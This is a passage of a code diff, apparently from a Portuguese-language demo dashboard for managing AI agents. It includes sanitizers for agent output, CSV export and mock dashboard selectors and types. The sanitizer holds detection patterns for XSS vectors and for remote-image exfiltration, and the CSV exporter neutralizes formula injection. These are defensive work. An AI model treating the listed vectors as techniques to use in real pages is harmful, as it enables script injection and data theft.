+const XSS_PATTERN =
+  /<\s*\/?\s*(?:script|iframe|object|embed|svg|math|style|link|meta)\b[^>]*>|on[a-z]+\s*=|javascript\s*:|vbscript\s*:|data\s*:\s*text\/html/gi;
+
+const REMOTE_IMAGE_MARKDOWN_PATTERN = /!\[([^\]]*)\]\(\s*(https?:\/\/[^\s)]+)\s*\)/gi;
+
+const HTML_IMG_TAG_PATTERN = /<\s*img\b[^>]*\bsrc\s*=\s*["']?(https?:\/\/[^"'\s>]+)["']?[^>]*>/gi;
+
+/**
+ * Sanitiza conteudo emitido por agente antes da renderizacao em componentes React.
+ * Nunca produz HTML bruto; divide e neutraliza trechos maliciosos e imagens remotas.
+ */
+export function sanitizeAgentMessageContent(rawContent: string): SanitizedAgentOutput {
+  const blockedRemoteImages: string[] = [];
+  let working = rawContent;
+
+  working = working.replace(
+    REMOTE_IMAGE_MARKDOWN_PATTERN,
+    (_fullMatch, _alt: string, url: string) => {
+      blockedRemoteImages.push(url);
+      return `[IMAGEM_REMOTA_BLOQUEADA:${url}]`;
+    },
+  );
+
+  working = working.replace(HTML_IMG_TAG_PATTERN, (_fullMatch, url: string) => {
+    blockedRemoteImages.push(url);
+    return `[IMAGEM_REMOTA_BLOQUEADA:${url}]`;
+  });
+
+  const xssMatches = working.match(XSS_PATTERN);
+  const blockedXssCount = xssMatches ? xssMatches.length : 0;
+
+  if (blockedXssCount > 0) {
+    working = working.replace(XSS_PATTERN, "[CONTEUDO_ATUADO_POR_POLITICA_XSS]");
+  }
+
+  const lines = working.split("\n");
+  const safeSegments: SafeMessageSegment[] = [];
+
+  for (const line of lines) {
+    if (line.includes("[IMAGEM_REMOTA_BLOQUEADA:")) {
+      safeSegments.push({
+        kind: "blocked_remote_image",
+        content: line,
+      });
+    } else if (line.includes("[CONTEUDO_ATUADO_POR_POLITICA_XSS]")) {
+      safeSegments.push({
+        kind: "blocked_xss",
+        content: line,
+      });
+    } else if (line.trim().startsWith("`") && line.trim().endsWith("`")) {
+      safeSegments.push({
+        kind: "code",
+        content: line.trim().slice(1, -1),
+      });
+    } else {
+      safeSegments.push({
+        kind: "text",
+        content: line,
+      });
+    }
+  }
+
+  return {
+    safeSegments,
+    blockedXssCount,
+    blockedRemoteImages,
+  };
+}
+
+/**
+ * Gera chave deterministica de idempotencia para mutacoes da UI (WEB-002).
+ */
+export function createIdempotencyKey(scope: string, targetId: string, action: string): string {
+  const normalized = `${scope.trim()}:${targetId.trim()}:${action.trim()}`
+    .toLowerCase()
+    .replace(/[^a-z0-9:_-]/g, "-");
+  return `idem-${normalized}`;
+}
+
+export interface IdempotencyCheckResult {
+  readonly allowed: boolean;
+  readonly idempotencyKey: string;
+  readonly updatedKeys: readonly string[];
+}
+
+export function registerIdempotentMutation(
+  existingKeys: readonly string[],
+  scope: string,
+  targetId: string,
+  action: string,
+): IdempotencyCheckResult {
+  const key = createIdempotencyKey(scope, targetId, action);
+  if (existingKeys.includes(key)) {
+    return {
+      allowed: false,
+      idempotencyKey: key,
+      updatedKeys: existingKeys,
+    };
+  }
+  return {
+    allowed: true,
+    idempotencyKey: key,
+    updatedKeys: [...existingKeys, key],
+  };
+}
+
+function escapeCsvCell(value: string | number): string {
+  const raw = String(value);
+  // Previne CSV Formula Injection (=, +, -, @, tab, CR no inicio da celula)
+  const neutralized = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
+  const escaped = neutralized.replace(/"/g, '""');
+  return `"${escaped}"`;
+}
+
+/**
+ * Exporta o relatorio de consumo de IA da organizacao em formato CSV seguro (WEB-003).
+ */
+export function buildOrganizationUsageCsv(rows: readonly DepartmentUsageCsvRow[]): string {
+  const header = [
+    "organizacao",
+    "departamento",
+    "modulo",
+    "agente",
+    "modelo",
+    "tokens_usados_mes",
+    "tokens_limite_mes",
+    "gasto_mensal_brl",
+    "orcamento_mensal_brl",
+  ].join(",");
+
+  const bodyLines = rows.map((row) =>
+    [
+      escapeCsvCell(row.organizationSlug),
+      escapeCsvCell(row.departmentName),
+      escapeCsvCell(row.moduleCode),
+      escapeCsvCell(row.agentName),
+      escapeCsvCell(row.modelName),
+      escapeCsvCell(row.tokensUsedMonth),
+      escapeCsvCell(row.tokensLimitMonth),
+      escapeCsvCell(row.monthlySpentBrl),
+      escapeCsvCell(row.monthlyBudgetBrl),
+    ].join(","),
+  );
+
+  return [header, ...bodyLines].join("\n");
+}
diff --git a/apps/web/lib/mock-selectors.ts b/apps/web/lib/mock-selectors.ts
new file mode 100644
index 0000000..830c4ce
--- /dev/null
+++ b/apps/web/lib/mock-selectors.ts
@@ -0,0 +1,244 @@
+import { DEMO_ENVIRONMENT_BANNER, MOCK_ORGANIZATIONS } from "./mock-fixtures.ts";
+import type {
+  BudgetConsumptionSummary,
+  DashboardMetricsSummary,
+  DashboardViewModel,
+  DemoStateVariant,
+  FloorPresentation,
+  MockAgent,
+  MockDepartmentFloor,
+  MockOrganizationFixture,
+  MockOrganizationSummary,
+  UserRole,
+} from "./mock-types.ts";
+
+export interface DeriveDashboardOptions {
+  readonly orgSlug?: string;
+  readonly variant?: DemoStateVariant;
+  readonly selectedFloorId?: string;
+  readonly agentQuery?: string;
+}
+
+export function listMockOrganizations(): readonly MockOrganizationSummary[] {
+  return MOCK_ORGANIZATIONS.map((org) => ({
+    id: org.id,
+    slug: org.slug,
+    displayName: org.displayName,
+    planName: org.planName,
+    tenantState: org.tenantState,
+    activeRole: org.activeRole,
+  }));
+}
+
+export function getMockOrganizationBySlug(slug?: string): MockOrganizationFixture {
+  const fallback = MOCK_ORGANIZATIONS[0];
+  if (!fallback) {
+    throw new Error("MOCK_ORGANIZATIONS deve conter ao menos uma organizacao.");
+  }
+  if (!slug) {
+    return fallback;
+  }
+  const matched = MOCK_ORGANIZATIONS.find((org) => org.slug === slug);
+  return matched ?? fallback;
+}
+
+export function roleCanDecideApprovals(role: UserRole): boolean {
+  return role === "org_admin" || role === "department_manager" || role === "operator";
+}
+
+export function computeBudgetStatus(spent: number, limit: number): BudgetConsumptionSummary {
+  const safeSpent = Math.max(0, spent);
+  const safeLimit = Math.max(0, limit);
+  const rawPercentage = safeLimit === 0 ? 0 : Math.round((safeSpent / safeLimit) * 100);
+
+  if (rawPercentage >= 100) {
+    return {
+      spentBrl: safeSpent,
+      limitBrl: safeLimit,
+      percentage: rawPercentage,
+      alertLevel: "critical_100",
+      alertLabel: "Limite 100% atingido (bloqueio preventivo)",
+    };
+  }
+
+  if (rawPercentage >= 80) {
+    return {
+      spentBrl: safeSpent,
+      limitBrl: safeLimit,
+      percentage: rawPercentage,
+      alertLevel: "warning_80",
+      alertLabel: "Alerta de orçamento (acima de 80%)",
+    };
+  }
+
+  return {
+    spentBrl: safeSpent,
+    limitBrl: safeLimit,
+    percentage: rawPercentage,
+    alertLevel: "healthy",
+    alertLabel: "Dentro do orçamento",
+  };
+}
+
+function buildFloorPresentation(floor: MockDepartmentFloor): FloorPresentation {
+  const budgetStatus = computeBudgetStatus(floor.monthlySpentBrl, floor.monthlyBudgetBrl);
+  const tokenStatus = computeBudgetStatus(floor.tokensUsedMonth, floor.tokensLimitMonth);
+  const executingAgentsCount = floor.agents.filter((agent) => agent.status === "executing").length;
+  const awaitingApprovalCount = floor.agents.filter(
+    (agent) => agent.status === "awaiting_approval",
+  ).length;
+
+  return {
+    ...floor,
+    budgetStatus,
+    tokenStatus,
+    executingAgentsCount,
+    awaitingApprovalCount,
+  };
+}
+
+function createZeroMetrics(): DashboardMetricsSummary {
+  return {
+    totalFloors: 0,
+    totalAgents: 0,
+    executingAgents: 0,
+    awaitingApprovalAgents: 0,
+    activeTasksCount: 0,
+    pendingApprovalsCount: 0,
+    budgetAlertFloorsCount: 0,
+    totalBudget: computeBudgetStatus(0, 0),
+  };
+}
+
+export function deriveDashboardViewModel(options: DeriveDashboardOptions = {}): DashboardViewModel {
+  const variant: DemoStateVariant = options.variant ?? "ready";
+  const org = getMockOrganizationBySlug(options.orgSlug);
+  const canDecideApprovals = roleCanDecideApprovals(org.activeRole);
+  const isProvisioning = org.tenantState === "PROVISIONING";
+
+  const baseOrganization = {
+    id: org.id,
+    slug: org.slug,
+    displayName: org.displayName,
+    legalName: org.legalName,
+    planName: org.planName,
+    tenantState: org.tenantState,
+    activeRole: org.activeRole,
+    activeUserLabel: org.activeUserLabel,
+    lastSyncLabel: org.lastSyncLabel,
+    securityBanner: org.securityBanner,
+    canDecideApprovals,
+    isProvisioning,
+  };
+
+  if (variant === "loading") {
+    return {
+      variant: "loading",
+      isDemoEnvironment: true,
+      demoBannerText: DEMO_ENVIRONMENT_BANNER,
+      organization: baseOrganization,
+      metrics: createZeroMetrics(),
+      floors: [],
+      selectedFloor: null,
+      filteredAgents: [],
+      tasks: [],
+      approvals: [],
+      recentActivity: [],
+      errorDetails: null,
+      emptyStateMessage: null,
+    };
+  }
+
+  if (variant === "error") {
+    return {
+      variant: "error",
+      isDemoEnvironment: true,
+      demoBannerText: DEMO_ENVIRONMENT_BANNER,
+      organization: baseOrganization,
+      metrics: createZeroMetrics(),
+      floors: [],
+      selectedFloor: null,
+      filteredAgents: [],
+      tasks: [],
+      approvals: [],
+      recentActivity: [],
+      errorDetails: org.simulatedError,
+      emptyStateMessage: null,
+    };
+  }
+
+  if (variant === "empty") {
+    return {
+      variant: "empty",
+      isDemoEnvironment: true,
+      demoBannerText: DEMO_ENVIRONMENT_BANNER,
+      organization: baseOrganization,
+      metrics: createZeroMetrics(),
+      floors: [],
+      selectedFloor: null,
+      filteredAgents: [],
+      tasks: [],
+      approvals: [],
+      recentActivity: [],
+      errorDetails: null,
+      emptyStateMessage:
+        "Nenhum departamento ou agente provisionado nesta visualização demonstrativa. Quando os módulos forem ativados no Control Plane, os andares do edifício e as filas aparecerão aqui.",
+    };
+  }
+
+  // Ordena do andar mais alto para o terreo (representacao visual de predio)
+  const sortedFloors = [...org.floors]
+    .sort((a, b) => b.floorNumber - a.floorNumber)
+    .map((floor) => buildFloorPresentation(floor));
+
+  const selectedFloor =
+    sortedFloors.find((floor) => floor.id === options.selectedFloorId) ?? sortedFloors[0] ?? null;
+
+  const allAgents: MockAgent[] = sortedFloors.flatMap((floor) => floor.agents);
+  const normalizedQuery = (options.agentQuery ?? "").trim().toLowerCase();
+  const sourceAgents = selectedFloor ? selectedFloor.agents : allAgents;
+  const filteredAgents = normalizedQuery
+    ? sourceAgents.filter(
+        (agent) =>
+          agent.name.toLowerCase().includes(normalizedQuery) ||
+          agent.roleTitle.toLowerCase().includes(normalizedQuery) ||
+          agent.code.toLowerCase().includes(normalizedQuery) ||
+          agent.currentTaskSummary.toLowerCase().includes(normalizedQuery),
+      )
+    : sourceAgents;
+
+  const totalSpentBrl = sortedFloors.reduce((acc, floor) => acc + floor.monthlySpentBrl, 0);
+  const totalLimitBrl = sortedFloors.reduce((acc, floor) => acc + floor.monthlyBudgetBrl, 0);
+  const budgetAlertFloorsCount = sortedFloors.filter(
+    (floor) => floor.budgetStatus.alertLevel !== "healthy",
+  ).length;
+
+  const metrics: DashboardMetricsSummary = {
+    totalFloors: sortedFloors.length,
+    totalAgents: allAgents.length,
+    executingAgents: allAgents.filter((a) => a.status === "executing").length,
+    awaitingApprovalAgents: allAgents.filter((a) => a.status === "awaiting_approval").length,
+    activeTasksCount: org.tasks.filter(
+      (t) => t.status === "running" || t.status === "queued" || t.status === "awaiting_human",
+    ).length,
+    pendingApprovalsCount: org.approvals.length,
+    budgetAlertFloorsCount,
+    totalBudget: computeBudgetStatus(totalSpentBrl, totalLimitBrl),
+  };
+
+  return {
+    variant: "ready",
+    isDemoEnvironment: true,
+    demoBannerText: DEMO_ENVIRONMENT_BANNER,
+    organization: baseOrganization,
+    metrics,
+    floors: sortedFloors,
+    selectedFloor,
+    filteredAgents,
+    tasks: org.tasks,
+    approvals: org.approvals,
+    recentActivity: org.recentActivity,
+    errorDetails: null,
+    emptyStateMessage: null,
+  };
+}
diff --git a/apps/web/lib/mock-types.ts b/apps/web/lib/mock-types.ts
new file mode 100644
index 0000000..e3f1d64
--- /dev/null
+++ b/apps/web/lib/mock-types.ts
@@ -0,0 +1,173 @@
+/**
+ * Tipos do modelo local de demonstracao do frontend (LOC-WEB-001).
+ *
+ * IMPORTANTE: Estes tipos existem exclusivamente para validar a direcao visual
+ * de WEB-001, WEB-003 e WEB-005 com dados mockados locais enquanto o backend
+ * permanece pausado. Nao substituem `@nucleos/contracts` nem `@nucleos/sdk`.
+ */
+
+export type DemoStateVariant = "ready" | "loading" | "empty" | "error";
+
+export type TenantLifecycleState = "ACTIVE" | "PROVISIONING" | "SUSPENDED";
+
+export type UserRole = "org_admin" | "department_manager" | "operator" | "viewer";
+
+export type AgentStatus = "executing" | "idle" | "awaiting_approval" | "degraded";
+
+export type TaskStatus = "running" | "queued" | "awaiting_human" | "completed" | "failed";
+
+export type ApprovalRiskLevel = "low" | "medium" | "high";
+
+export type BudgetAlertLevel = "healthy" | "warning_80" | "critical_100";
+
+export type SecurityEventSeverity = "info" | "warning" | "high";
+
+export interface MockAgent {
+  readonly id: string;
+  readonly code: string;
+  readonly name: string;
+  readonly roleTitle: string;
+  readonly departmentId: string;
+  readonly departmentName: string;
+  readonly floorNumber: number;
+  readonly workstationCode: string;
+  readonly status: AgentStatus;
+  readonly modelName: string;
+  readonly currentTaskSummary: string;
+  readonly tokensUsedMonth: number;
+  readonly tokensLimitMonth: number;
+}
+
+export interface MockDepartmentFloor {
+  readonly id: string;
+  readonly slug: string;
+  readonly name: string;
+  readonly floorNumber: number;
+  readonly moduleCode: string;
+  readonly summary: string;
+  readonly monthlyBudgetBrl: number;
+  readonly monthlySpentBrl: number;
+  readonly tokensUsedMonth: number;
+  readonly tokensLimitMonth: number;
+  readonly agents: readonly MockAgent[];
+}
+
+export interface MockTaskItem {
+  readonly id: string;
+  readonly code: string;
+  readonly title: string;
+  readonly departmentId: string;
+  readonly departmentName: string;
+  readonly agentName: string;
+  readonly status: TaskStatus;
+  readonly startedAtLabel: string;
+  readonly durationLabel: string;
+}
+
+export interface MockApprovalItem {
+  readonly id: string;
+  readonly actionHash: string;
+  readonly title: string;
+  readonly serverSummary: string;
+  readonly departmentName: string;
+  readonly agentName: string;
+  readonly riskLevel: ApprovalRiskLevel;
+  readonly expiresInLabel: string;
+  readonly argumentsPreview: string;
+  readonly requiredPermission: "approvals:decide";
+}
+
+export interface MockSecurityActivityItem {
+  readonly id: string;
+  readonly timestampLabel: string;
+  readonly eventCode: string;
+  readonly summary: string;
+  readonly actorLabel: string;
+  readonly severity: SecurityEventSeverity;
+  readonly correlationId: string;
+}
+
+export interface MockProblemDetails {
+  readonly code: string;
+  readonly httpStatus: number;
+  readonly title: string;
+  readonly userMessage: string;
+  readonly correlationId: string;
+  readonly retryable: boolean;
+}
+
+export interface MockOrganizationFixture {
+  readonly id: string;
+  readonly slug: string;
+  readonly displayName: string;
+  readonly legalName: string;
+  readonly planName: string;
+  readonly tenantState: TenantLifecycleState;
+  readonly activeRole: UserRole;
+  readonly activeUserLabel: string;
+  readonly lastSyncLabel: string;
+  readonly securityBanner: string | null;
+  readonly floors: readonly MockDepartmentFloor[];
+  readonly tasks: readonly MockTaskItem[];
+  readonly approvals: readonly MockApprovalItem[];
+  readonly recentActivity: readonly MockSecurityActivityItem[];
+  readonly simulatedError: MockProblemDetails;
+}
+
+export interface MockOrganizationSummary {
+  readonly id: string;
+  readonly slug: string;
+  readonly displayName: string;
+  readonly planName: string;
+  readonly tenantState: TenantLifecycleState;
+  readonly activeRole: UserRole;
+}
+
+export interface BudgetConsumptionSummary {
+  readonly spentBrl: number;
+  readonly limitBrl: number;
+  readonly percentage: number;
+  readonly alertLevel: BudgetAlertLevel;
+  readonly alertLabel: string;
+}
+
+export interface FloorPresentation extends MockDepartmentFloor {
+  readonly budgetStatus: BudgetConsumptionSummary;
+  readonly tokenStatus: BudgetConsumptionSummary;
+  readonly executingAgentsCount: number;
+  readonly awaitingApprovalCount: number;
+}
+
+export interface DashboardMetricsSummary {
+  readonly totalFloors: number;
+  readonly totalAgents: number;
+  readonly executingAgents: number;
+  readonly awaitingApprovalAgents: number;
+  readonly activeTasksCount: number;
+  readonly pendingApprovalsCount: number;
+  readonly budgetAlertFloorsCount: number;
+  readonly totalBudget: BudgetConsumptionSummary;
+}
+
+export interface DashboardViewModel {
+  readonly variant: DemoStateVariant;
+  readonly isDemoEnvironment: true;
+  readonly demoBannerText: string;
+  readonly organization: MockOrganizationSummary & {
+    readonly legalName: string;
+    readonly activeUserLabel: string;
+    readonly lastSyncLabel: string;
+    readonly securityBanner: string | null;
+    readonly canDecideApprovals: boolean;
+    readonly isProvisioning: boolean;
+  };
+  readonly metrics: DashboardMetricsSummary;
+  readonly floors: readonly FloorPresentation[];
+  readonly selectedFloor: FloorPresentation | null;
+  readonly filteredAgents: readonly MockAgent[];
+  readonly tasks: readonly MockTaskItem[];
+  readonly approvals: readonly MockApprovalItem[];
+  readonly recentActivity: readonly MockSecurityActivityItem[];
+  readonly errorDetails: MockProblemDetails | null;
+  readonly emptyStateMessage: string | null;
+}
```
